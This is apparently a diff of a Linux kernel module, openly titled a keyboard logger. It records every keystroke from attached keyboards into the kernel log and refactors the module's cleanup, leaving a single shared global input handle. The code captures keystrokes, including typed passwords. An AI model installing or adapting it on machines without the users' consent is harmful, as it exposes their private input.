@@ -41,16 +41,19 @@ MODULE_DESCRIPTION("Input driver keyboard logger");
 #define NUMDEVS  1
 #define DEVNAME  "kbdlogger"
 
-struct input_event keyev;
-dev_t devnum;
-u64   pressev;
-char  *starttime;
 const char *kbdstr = "keyboard";
+struct input_handle *handle;
+
+static void kbdlogger_cleanup(void)
+{
+	input_close_device(handle);
+	input_unregister_handle(handle);
+	kfree(handle);
+}
 
 static int kbdlogger_connect(struct input_handler *handler,
 		struct input_dev *dev, const struct input_device_id *id)
 {
-	struct input_handle *handle;
 	int error;
 
 	if (strstr(dev->name, kbdstr)) {
@@ -92,11 +95,6 @@ static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 	if (type == EV_KEY) {
 		pr_info("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n",
 		dev_name(&handle->dev->dev), type, code, value);
-		pressev++;
-		keyev.value = value;
-		keyev.type  = type;
-		keyev.code  = code;
-		do_gettimeofday(&keyev.time);
 	}
 }
 
@@ -104,10 +102,8 @@ static void kbdlogger_disconnect(struct input_handle *handle)
 {
 	pr_info("Disconnected device: %s\n",
 		dev_name(&handle->dev->dev));
+	kbdlogger_cleanup();
 
-	input_close_device(handle);
-	input_unregister_handle(handle);
-	kfree(handle);
 }
 
 static const struct input_device_id kbdlogger_ids[] = {
@@ -125,10 +121,6 @@ static struct input_handler kbdlogger_handler = {
 	.name       = "kbdlogger_handler",
 };
 
-static void kbdlogger_cleanup(void)
-{
-	input_unregister_handler(&kbdlogger_handler);
-}
 
 static int __init kbdlogger_init(void)
 {
@@ -140,8 +132,6 @@ static int __init kbdlogger_init(void)
 		goto fail;
 	}
 
-	memset(&keyev, 0, sizeof(struct input_event));
-	pressev = 0;
 	pr_info("loaded\n");
 	return 0;
 fail:
@@ -152,7 +142,7 @@ fail:
 
 static void __exit kbdlogger_exit(void)
 {
-	kbdlogger_cleanup();
+	input_unregister_handler(&kbdlogger_handler);
 	pr_info("exited\n");
 }
 
